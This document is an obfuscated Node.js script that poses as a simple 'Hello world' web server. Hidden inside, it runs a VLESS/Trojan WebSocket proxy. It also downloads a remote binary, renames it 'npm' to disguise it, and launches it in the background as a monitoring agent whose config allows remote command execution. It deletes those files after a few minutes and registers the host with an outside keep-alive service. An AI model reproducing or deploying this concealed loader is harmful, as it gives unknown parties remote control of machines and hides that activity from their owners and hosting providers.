const _0x43fad3=_0xc961;(function(_0x2207d5,_0x258d61){const _0x1c0520=_0xc961,_0x40d815=_0x2207d5();while(!![]){try{const _0x3abe2a=-parseInt(_0x1c0520(0x12b))/0x1*(parseInt(_0x1c0520(0x14c))/0x2)+parseInt(_0x1c0520(0x173))/0x3*(-parseInt(_0x1c0520(0x190))/0x4)+parseInt(_0x1c0520(0x16f))/0x5+parseInt(_0x1c0520(0x135))/0x6*(parseInt(_0x1c0520(0x1aa))/0x7)+parseInt(_0x1c0520(0x194))/0x8*(parseInt(_0x1c0520(0x134))/0x9)+parseInt(_0x1c0520(0x13f))/0xa*(parseInt(_0x1c0520(0x155))/0xb)+parseInt(_0x1c0520(0x14f))/0xc*(-parseInt(_0x1c0520(0x18f))/0xd);if(_0x3abe2a===_0x258d61)break;else _0x40d815['push'](_0x40d815['shift']());}catch(_0x15521f){_0x40d815['push'](_0x40d815['shift']());}}}(_0x575e,0x39f64));const os=require('os'),http=require(_0x43fad3(0x17f)),fs=require('fs'),axios=require('axios'),net=require(_0x43fad3(0x167)),path=require(_0x43fad3(0x175)),crypto=require('crypto'),{Buffer}=require(_0x43fad3(0x197)),{exec,execSync}=require(_0x43fad3(0x12a)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x43fad3(0x191)][_0x43fad3(0x13c)]||_0x43fad3(0x139),NEZHA_SERVER=process['env'][_0x43fad3(0x16b)]||'',NEZHA_PORT=process[_0x43fad3(0x191)][_0x43fad3(0x15f)]||'',NEZHA_KEY=process[_0x43fad3(0x191)][_0x43fad3(0x15c)]||'',DOMAIN=process[_0x43fad3(0x191)][_0x43fad3(0x19d)]||_0x43fad3(0x18a),AUTO_ACCESS=process['env'][_0x43fad3(0x19e)]||![],WSPATH=process['env'][_0x43fad3(0x192)]||UUID[_0x43fad3(0x172)](0x0,0x8),SUB_PATH=process[_0x43fad3(0x191)][_0x43fad3(0x169)]||_0x43fad3(0x17c),NAME=process['env'][_0x43fad3(0x160)]||_0x43fad3(0x1a9),PORT=process['env'][_0x43fad3(0x138)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x55c010=_0x43fad3;try{const _0x4ce6a6=await axios[_0x55c010(0x15e)](_0x55c010(0x15a)),_0x17fe1e=_0x4ce6a6['data'];ISP=(_0x17fe1e[_0x55c010(0x1a2)]+'-'+_0x17fe1e[_0x55c010(0x188)])[_0x55c010(0x176)](/ /g,'_');}catch(_0x61dab){ISP=_0x55c010(0x133);}};function _0xc961(_0x1fe2a7,_0x1f7054){_0x1fe2a7=_0x1fe2a7-0x121;const _0x575e1c=_0x575e();let _0xc96110=_0x575e1c[_0x1fe2a7];return _0xc96110;}GetISP();const httpServer=http[_0x43fad3(0x1a0)]((_0x4ece73,_0x1004fb)=>{const _0x440e53=_0x43fad3;if(_0x4ece73['url']==='/'){const _0x3eda16=path[_0x440e53(0x156)](__dirname,_0x440e53(0x1a1));fs[_0x440e53(0x14d)](_0x3eda16,'utf8',(_0x8a27d4,_0x28a3b5)=>{const _0x96ffeb=_0x440e53;if(_0x8a27d4){_0x1004fb[_0x96ffeb(0x198)](0xc8,{'Content-Type':'text/html'}),_0x1004fb[_0x96ffeb(0x179)](_0x96ffeb(0x18d));return;}_0x1004fb[_0x96ffeb(0x198)](0xc8,{'Content-Type':_0x96ffeb(0x14e)}),_0x1004fb[_0x96ffeb(0x179)](_0x28a3b5);});return;}else{if(_0x4ece73['url']==='/'+SUB_PATH){const _0x38ce89=NAME?NAME+'-'+ISP:ISP,_0x526f7b=_0x440e53(0x1a7)+UUID+'@'+DOMAIN+_0x440e53(0x128)+DOMAIN+_0x440e53(0x18e)+DOMAIN+_0x440e53(0x144)+WSPATH+'#'+_0x38ce89,_0x4e8cc2=_0x440e53(0x171)+UUID+'@'+DOMAIN+_0x440e53(0x132)+DOMAIN+_0x440e53(0x18e)+DOMAIN+_0x440e53(0x144)+WSPATH+'#'+_0x38ce89,_0x5d8fba=_0x526f7b+'\x0a'+_0x4e8cc2,_0x1deaba=Buffer['from'](_0x5d8fba)[_0x440e53(0x140)](_0x440e53(0x159));_0x1004fb[_0x440e53(0x198)](0xc8,{'Content-Type':_0x440e53(0x13d)}),_0x1004fb[_0x440e53(0x179)](_0x1deaba+'\x0a');}else _0x1004fb[_0x440e53(0x198)](0x194,{'Content-Type':_0x440e53(0x13d)}),_0x1004fb['end']('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x43fad3(0x176)](/-/g,''),DNS_SERVERS=[_0x43fad3(0x154),_0x43fad3(0x184)];function resolveHost(_0x5392be){return new Promise((_0x543548,_0x172816)=>{const _0x3a2155=_0xc961;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3a2155(0x122)](_0x5392be)){_0x543548(_0x5392be);return;}let _0x46be70=0x0;function _0xb0c2f2(){const _0x4d0083=_0x3a2155;if(_0x46be70>=DNS_SERVERS[_0x4d0083(0x12c)]){_0x172816(new Error(_0x4d0083(0x187)+_0x5392be+_0x4d0083(0x13a)));return;}const _0x291755=DNS_SERVERS[_0x46be70];_0x46be70++;const _0x7df810=_0x4d0083(0x1a5)+encodeURIComponent(_0x5392be)+_0x4d0083(0x14b);axios[_0x4d0083(0x15e)](_0x7df810,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x4d0083(0x121)](_0x1ab687=>{const _0xab831c=_0x4d0083,_0x13e671=_0x1ab687['data'];if(_0x13e671[_0xab831c(0x185)]===0x0&&_0x13e671[_0xab831c(0x17e)]&&_0x13e671['Answer'][_0xab831c(0x12c)]>0x0){const _0x688786=_0x13e671['Answer']['find'](_0x3a982c=>_0x3a982c[_0xab831c(0x125)]===0x1);if(_0x688786){_0x543548(_0x688786[_0xab831c(0x196)]);return;}}_0xb0c2f2();})[_0x4d0083(0x19b)](_0x7c1c77=>{_0xb0c2f2();});}_0xb0c2f2();});}function _0x575e(){const _0x163b63=['PORT','2f71657c-2d46-4270-89c0-f7f4cd65e914','\x20with\x20all\x20DNS\x20servers','https://amd64.ssss.nyc.mn/v1','UUID','text/plain','message','2362310oRfDpY','toString','false','digest','write','&path=%2F','2096','connect','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','finish','substr','unlink','&type=A','20mKrFhi','readFile','text/html','7164NabJpj','setsid\x20nohup\x20./npm\x20-s\x20','error:\x20','pipe','readUInt8','8.8.4.4','11zFTFOI','join','true','trim','base64','https://api.ip.sb/geoip','split','NEZHA_KEY','config.yaml','get','NEZHA_PORT','NAME','8443','readUInt16BE','/bin/bash','includes','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','--tls','net','npm\x20is\x20already\x20running,\x20skip\x20running...','SUB_PATH','arm','NEZHA_SERVER','every','writeFileSync','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','1680345aeLNPV','npm\x20is\x20running','trojan://','slice','183LObZaf','map','path','replace','aarch64','client_secret:\x20','end','concat','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','sub','https://arm64.ssss.nyc.mn/agent','Answer','http','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://amd64.ssss.nyc.mn/agent','npm\x20running\x20error:','update','1.1.1.1','Status','reduce','Failed\x20to\x20resolve\x20','isp','utf-8','1234.abc.com','arm64','sha224','Hello\x20world!','&fp=chrome&type=ws&host=','4849dhaSmq','5276yHZLlD','env','WSPATH','npm\x20download\x20successfully','3408nankHU','https://oooo.serv00.net/add-url','data','buffer','writeHead','arch','log','catch','\x20-p\x20','DOMAIN','AUTO_ACCESS','listen','createServer','index.html','country_code','post','hex','https://dns.google/resolve?name=','createHash','vless://','url','Hug','842751HupbjG','then','test','pop','close','type','createWriteStream','443',':443?encryption=none&security=tls&sni=','Automatic\x20Access\x20Task\x20added\x20successfully','child_process','33047qWadjo','length','https://','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','npm','error','2083',':443?security=tls&sni=','Unknown','1224vzTSRZ','12LsMRrZ','decode','Server\x20is\x20running\x20on\x20port\x20'];_0x575e=function(){return _0x163b63;};return _0x575e();}function handleVlessConnection(_0x3b61e8,_0x19b8e0){const _0x5e2c72=_0x43fad3,[_0x39c3b4]=_0x19b8e0,_0x414bc4=_0x19b8e0[_0x5e2c72(0x172)](0x1,0x11);if(!_0x414bc4[_0x5e2c72(0x16c)]((_0x34d239,_0x4529b5)=>_0x34d239==parseInt(uuid['substr'](_0x4529b5*0x2,0x2),0x10)))return![];let _0x2fe690=_0x19b8e0['slice'](0x11,0x12)[_0x5e2c72(0x153)]()+0x13;const _0x55b94d=_0x19b8e0[_0x5e2c72(0x172)](_0x2fe690,_0x2fe690+=0x2)[_0x5e2c72(0x162)](0x0),_0x25508f=_0x19b8e0[_0x5e2c72(0x172)](_0x2fe690,_0x2fe690+=0x1)[_0x5e2c72(0x153)](),_0x30749d=_0x25508f==0x1?_0x19b8e0[_0x5e2c72(0x172)](_0x2fe690,_0x2fe690+=0x4)[_0x5e2c72(0x156)]('.'):_0x25508f==0x2?new TextDecoder()[_0x5e2c72(0x136)](_0x19b8e0['slice'](_0x2fe690+0x1,_0x2fe690+=0x1+_0x19b8e0[_0x5e2c72(0x172)](_0x2fe690,_0x2fe690+0x1)[_0x5e2c72(0x153)]())):_0x25508f==0x3?_0x19b8e0[_0x5e2c72(0x172)](_0x2fe690,_0x2fe690+=0x10)[_0x5e2c72(0x186)]((_0x5c3dd6,_0x159d04,_0x59fd78,_0x1c224c)=>_0x59fd78%0x2?_0x5c3dd6[_0x5e2c72(0x17a)](_0x1c224c[_0x5e2c72(0x172)](_0x59fd78-0x1,_0x59fd78+0x1)):_0x5c3dd6,[])[_0x5e2c72(0x174)](_0x569483=>_0x569483['readUInt16BE'](0x0)[_0x5e2c72(0x140)](0x10))[_0x5e2c72(0x156)](':'):'';_0x3b61e8['send'](new Uint8Array([_0x39c3b4,0x0]));const _0x5309d2=createWebSocketStream(_0x3b61e8);return resolveHost(_0x30749d)[_0x5e2c72(0x121)](_0x2225ef=>{const _0x19249c=_0x5e2c72;net[_0x19249c(0x146)]({'host':_0x2225ef,'port':_0x55b94d},function(){const _0x3c5342=_0x19249c;this[_0x3c5342(0x143)](_0x19b8e0['slice'](_0x2fe690)),_0x5309d2['on']('error',()=>{})[_0x3c5342(0x152)](this)['on'](_0x3c5342(0x130),()=>{})[_0x3c5342(0x152)](_0x5309d2);})['on']('error',()=>{});})['catch'](_0x52728d=>{const _0x8ec4e6=_0x5e2c72;net[_0x8ec4e6(0x146)]({'host':_0x30749d,'port':_0x55b94d},function(){const _0x346bf2=_0x8ec4e6;this[_0x346bf2(0x143)](_0x19b8e0[_0x346bf2(0x172)](_0x2fe690)),_0x5309d2['on'](_0x346bf2(0x130),()=>{})[_0x346bf2(0x152)](this)['on'](_0x346bf2(0x130),()=>{})[_0x346bf2(0x152)](_0x5309d2);})['on'](_0x8ec4e6(0x130),()=>{});}),!![];}function handleTrojanConnection(_0x42f2b7,_0x2cf1de){const _0x42e3af=_0x43fad3;try{if(_0x2cf1de[_0x42e3af(0x12c)]<0x3a)return![];const _0x219d3e=_0x2cf1de['slice'](0x0,0x38)[_0x42e3af(0x140)](),_0x250cdc=[UUID];let _0xb238c4=null;for(const _0x26e505 of _0x250cdc){const _0x5a4ed3=crypto[_0x42e3af(0x1a6)](_0x42e3af(0x18c))[_0x42e3af(0x183)](_0x26e505)[_0x42e3af(0x142)](_0x42e3af(0x1a4));if(_0x5a4ed3===_0x219d3e){_0xb238c4=_0x26e505;break;}}if(!_0xb238c4)return![];let _0x3cd5f0=0x38;_0x2cf1de[_0x3cd5f0]===0xd&&_0x2cf1de[_0x3cd5f0+0x1]===0xa&&(_0x3cd5f0+=0x2);const _0x38415e=_0x2cf1de[_0x3cd5f0];if(_0x38415e!==0x1)return![];_0x3cd5f0+=0x1;const _0x56378e=_0x2cf1de[_0x3cd5f0];_0x3cd5f0+=0x1;let _0x2058fb,_0x3dbfc5;if(_0x56378e===0x1)_0x2058fb=_0x2cf1de[_0x42e3af(0x172)](_0x3cd5f0,_0x3cd5f0+0x4)[_0x42e3af(0x156)]('.'),_0x3cd5f0+=0x4;else{if(_0x56378e===0x3){const _0x409b8d=_0x2cf1de[_0x3cd5f0];_0x3cd5f0+=0x1,_0x2058fb=_0x2cf1de['slice'](_0x3cd5f0,_0x3cd5f0+_0x409b8d)[_0x42e3af(0x140)](),_0x3cd5f0+=_0x409b8d;}else{if(_0x56378e===0x4)_0x2058fb=_0x2cf1de[_0x42e3af(0x172)](_0x3cd5f0,_0x3cd5f0+0x10)[_0x42e3af(0x186)]((_0x3eae3c,_0x3cbc70,_0x4c54af,_0xe2af48)=>_0x4c54af%0x2?_0x3eae3c[_0x42e3af(0x17a)](_0xe2af48[_0x42e3af(0x172)](_0x4c54af-0x1,_0x4c54af+0x1)):_0x3eae3c,[])['map'](_0x304ba4=>_0x304ba4['readUInt16BE'](0x0)['toString'](0x10))[_0x42e3af(0x156)](':'),_0x3cd5f0+=0x10;else return![];}}_0x3dbfc5=_0x2cf1de['readUInt16BE'](_0x3cd5f0),_0x3cd5f0+=0x2;_0x3cd5f0<_0x2cf1de[_0x42e3af(0x12c)]&&_0x2cf1de[_0x3cd5f0]===0xd&&_0x2cf1de[_0x3cd5f0+0x1]===0xa&&(_0x3cd5f0+=0x2);const _0x4450e9=createWebSocketStream(_0x42f2b7);return resolveHost(_0x2058fb)[_0x42e3af(0x121)](_0x32b445=>{const _0x28596c=_0x42e3af;net[_0x28596c(0x146)]({'host':_0x32b445,'port':_0x3dbfc5},function(){const _0x22a371=_0x28596c;_0x3cd5f0<_0x2cf1de[_0x22a371(0x12c)]&&this['write'](_0x2cf1de['slice'](_0x3cd5f0)),_0x4450e9['on'](_0x22a371(0x130),()=>{})[_0x22a371(0x152)](this)['on'](_0x22a371(0x130),()=>{})[_0x22a371(0x152)](_0x4450e9);})['on'](_0x28596c(0x130),()=>{});})[_0x42e3af(0x19b)](_0x456e37=>{const _0x146915=_0x42e3af;net[_0x146915(0x146)]({'host':_0x2058fb,'port':_0x3dbfc5},function(){const _0x2b454f=_0x146915;_0x3cd5f0<_0x2cf1de['length']&&this['write'](_0x2cf1de[_0x2b454f(0x172)](_0x3cd5f0)),_0x4450e9['on']('error',()=>{})['pipe'](this)['on'](_0x2b454f(0x130),()=>{})['pipe'](_0x4450e9);})['on'](_0x146915(0x130),()=>{});}),!![];}catch(_0x38c58f){return![];}}wss['on']('connection',(_0x3893c3,_0xd7c178)=>{const _0x8f7f57=_0x43fad3,_0x1bd34c=_0xd7c178[_0x8f7f57(0x1a8)]||'';_0x3893c3['once'](_0x8f7f57(0x13e),_0x4dc65d=>{const _0x464176=_0x8f7f57;if(_0x4dc65d[_0x464176(0x12c)]>0x11&&_0x4dc65d[0x0]===0x0){const _0x149aff=_0x4dc65d[_0x464176(0x172)](0x1,0x11),_0x19cade=_0x149aff[_0x464176(0x16c)]((_0x1dd4c0,_0x575762)=>_0x1dd4c0==parseInt(uuid[_0x464176(0x149)](_0x575762*0x2,0x2),0x10));if(_0x19cade){!handleVlessConnection(_0x3893c3,_0x4dc65d)&&_0x3893c3[_0x464176(0x124)]();return;}}!handleTrojanConnection(_0x3893c3,_0x4dc65d)&&_0x3893c3[_0x464176(0x124)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x396421=_0x43fad3,_0x37d207=os[_0x396421(0x199)]();return _0x37d207===_0x396421(0x16a)||_0x37d207===_0x396421(0x18b)||_0x37d207===_0x396421(0x177)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x396421(0x17d):!NEZHA_PORT?_0x396421(0x13b):_0x396421(0x181);},downloadFile=async()=>{const _0x50c3fe=_0x43fad3;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x292be3=getDownloadUrl(),_0x5a148a=await axios({'method':_0x50c3fe(0x15e),'url':_0x292be3,'responseType':'stream'}),_0x18c362=fs[_0x50c3fe(0x126)](_0x50c3fe(0x12f));return _0x5a148a[_0x50c3fe(0x196)]['pipe'](_0x18c362),new Promise((_0x2a3438,_0x42000a)=>{const _0x544372=_0x50c3fe;_0x18c362['on'](_0x544372(0x148),()=>{const _0x2d956e=_0x544372;console[_0x2d956e(0x19a)](_0x2d956e(0x193)),exec('chmod\x20+x\x20npm',_0x2bd524=>{if(_0x2bd524)_0x42000a(_0x2bd524);_0x2a3438();});}),_0x18c362['on'](_0x544372(0x130),_0x42000a);});}catch(_0xb2d970){throw _0xb2d970;}},runnz=async()=>{const _0x49a3fb=_0x43fad3;try{const _0x375f8a=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x49a3fb(0x189)});if(_0x375f8a[_0x49a3fb(0x158)]()!==''){console[_0x49a3fb(0x19a)](_0x49a3fb(0x168));return;}}catch(_0xa98767){}await downloadFile();let _0x3bda36='',_0x2cac0c=[_0x49a3fb(0x127),_0x49a3fb(0x161),_0x49a3fb(0x145),'2087',_0x49a3fb(0x131),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2dbe7a=_0x2cac0c[_0x49a3fb(0x164)](NEZHA_PORT)?_0x49a3fb(0x166):'';_0x3bda36=_0x49a3fb(0x150)+NEZHA_SERVER+':'+NEZHA_PORT+_0x49a3fb(0x19c)+NEZHA_KEY+'\x20'+_0x2dbe7a+_0x49a3fb(0x17b);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x6401dc=NEZHA_SERVER[_0x49a3fb(0x164)](':')?NEZHA_SERVER[_0x49a3fb(0x15b)](':')[_0x49a3fb(0x123)]():'',_0x358f35=_0x2cac0c[_0x49a3fb(0x164)](_0x6401dc)?_0x49a3fb(0x157):_0x49a3fb(0x141),_0x335082=_0x49a3fb(0x178)+NEZHA_KEY+_0x49a3fb(0x180)+NEZHA_SERVER+_0x49a3fb(0x16e)+_0x358f35+_0x49a3fb(0x165)+UUID;fs[_0x49a3fb(0x16d)](_0x49a3fb(0x15d),_0x335082);}_0x3bda36=_0x49a3fb(0x147);}else{console[_0x49a3fb(0x19a)](_0x49a3fb(0x12e));return;}}try{exec(_0x3bda36,{'shell':_0x49a3fb(0x163)},_0x5c3585=>{const _0x4bbe3b=_0x49a3fb;if(_0x5c3585)console[_0x4bbe3b(0x130)](_0x4bbe3b(0x182),_0x5c3585);else console[_0x4bbe3b(0x19a)](_0x4bbe3b(0x170));});}catch(_0x138c18){console[_0x49a3fb(0x130)](_0x49a3fb(0x151)+_0x138c18);}};async function addAccessTask(){const _0x2b1db9=_0x43fad3;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4a0021=_0x2b1db9(0x12d)+DOMAIN;try{const _0xd285c0=await axios[_0x2b1db9(0x1a3)](_0x2b1db9(0x195),{'url':_0x4a0021},{'headers':{'Content-Type':'application/json'}});console['log'](_0x2b1db9(0x129));}catch(_0x4b1ff8){}}const delFiles=()=>{const _0x24d7d1=_0x43fad3;fs[_0x24d7d1(0x14a)](_0x24d7d1(0x12f),()=>{}),fs[_0x24d7d1(0x14a)](_0x24d7d1(0x15d),()=>{});};httpServer[_0x43fad3(0x19f)](PORT,()=>{const _0x208d91=_0x43fad3;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x208d91(0x137)+PORT);});
